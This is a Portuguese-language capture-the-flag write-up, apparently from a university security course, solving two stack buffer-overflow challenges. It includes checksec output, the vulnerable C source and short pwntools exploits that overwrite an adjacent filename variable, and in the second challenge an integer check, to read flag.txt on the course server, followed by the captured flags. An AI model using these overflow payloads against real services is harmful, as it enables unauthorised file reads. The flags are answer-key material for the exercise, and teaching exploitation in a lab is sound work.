## CTF 5
### CTF 5 Desafio 1
#### Primeiro passo - Checksec
Ao corrermos o checksec no programa, podemos descobrir várias coisas:
```
❯ checksec program
  Arch:     i386-32-little
  RELRO:    No RELRO
  Stack:    No canary found
  NX:       NX disabled
  PIE:      No PIE (0x8048000)
  RWX:      Has RWX segments 
```
* O programa está compilado para uma arquitetura de 32 bits e é little endian
* Não tem a proteção de *RELRO*
* Existem segmentos na memória com permissões de read, write e execute
* O ASLR está desativado
* O PIE está desativado
* NX está desativado
* Não tem *canary*

#### Segundo passo - Análise do código
```cpp
#include <stdio.h>
#include <stdlib.h>

int main() {
    char meme_file[8] = "mem.txt\0";
    char buffer[32];

    printf("Try to unlock the flag.\n");
    printf("Show me what you got:");
    fflush(stdout);
    scanf("%40s", &buffer);

    printf("Echo %s\n", buffer);

    printf("I like what you got!\n");
    
    FILE *fd = fopen(meme_file,"r");
    
    while(1){
        if(fd != NULL && fgets(buffer, 32, fd) != NULL) {
            printf("%s", buffer);
        } else {
            break;
        }
    }


    fflush(stdout);
    
    return 0;
}
```
Ao analisarmos o código, podemos ver que o programa lê 40 *chars* (
`scanf("%40s", &buffer);`)
para um *buffer* de 32 *chars*, o que nos permite fazer um *buffer overflow* e alterar o endereço de retorno da função ``main()``. 

Como o utilizador controla a entrada, ao escrever flag.txt após 32 caracteres, podemos facilmente sobrescrever a variável meme_file e fazer com que o programa leia o ficheiro flag.txt e imprima o seu conteúdo.

No programa python disponibilizado, na zona em que injetamos o conteúdo para o servidor, bastou escrever 32 caracteres seguidos do nome do ficheiro que queremos ler.

```python
r.sendline(b'A'*32+b'flag.txt\0')
```
#### Exploit
```python
from pwn import *

DEBUG = False

r = remote('ctf-fsi.fe.up.pt', 4003)

r.sendline(b'A'*32+b'flag.txt\0')

r.interactive()
```
Ao executar conseguimos ter acesso ao conteúdo do ficheiro flag.txt e à flag do desafio, flag{a96d05c11752a85ff9f172636ea1967a}.

![Flag](./images/flag5D1.png)

### CTF 5 Desafio 2
Este desafio é bastante similar ao anterior, só que, entre a variável do nome do ficheiro e o buffer temos um valor inteiro, que precisa de ser igual a ``0xfefc2324`` para ler a flag.

O único cuidado especial a ter é passar o valor do inteiro byte a byte de forma *Little Endian*, ou seja, ler o valor de trás para a frente.

Assim, se passarmos a string ``io.sendline(b'A'*32 + b"\x24\x23\xfc\xfe" + b"flag.txt\0")`` alcançamos a *flag*

```flag{bb0e0ad81a5d4378e34817e1e73e5381}```


![Flag](./images/flag5D2.png)
